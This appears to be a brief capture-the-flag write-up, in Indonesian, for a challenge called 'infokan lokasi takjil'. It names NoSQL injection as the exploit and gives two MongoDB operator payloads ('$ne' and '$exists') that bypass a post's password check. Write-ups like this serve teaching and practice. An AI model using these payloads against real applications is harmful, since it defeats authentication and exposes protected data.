# Basic TL;DR for "infokan lokasi takjil"

untuk soal ini, exploit nya adalah NoSQL injection. dengan payload seperti
```
{"$ne": "null"}

atau

{"$exists": true}
```
kita bisa bypass kebutuhan password untuk sebuah post